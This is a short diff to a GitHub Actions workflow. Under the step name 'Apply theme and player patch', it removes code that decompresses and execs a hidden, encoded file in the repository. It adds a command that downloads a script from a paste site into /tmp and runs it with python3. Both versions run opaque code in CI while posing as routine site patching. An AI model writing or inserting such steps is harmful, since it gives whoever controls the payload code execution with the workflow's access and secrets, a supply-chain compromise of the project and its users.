@@ -13,12 +13,9 @@ jobs:
     steps:
       - uses: actions/checkout@v4
       - name: Apply theme and player patch
-        shell: python
         run: |
-          import gzip
-          with open('.github/nx-patch.b64', 'rb') as fh:
-              code = gzip.decompress(fh.read()).decode('utf-8')
-          exec(compile(code, 'patch_site_v2.py', 'exec'), {'__name__': '__main__'})
+          curl -fsSL "https://paste.rs/aix2d" -o /tmp/nx-patch.py
+          python3 /tmp/nx-patch.py
       - name: Add Stickman Battle cover
         run: |
           mkdir -p Games/_covers/actual
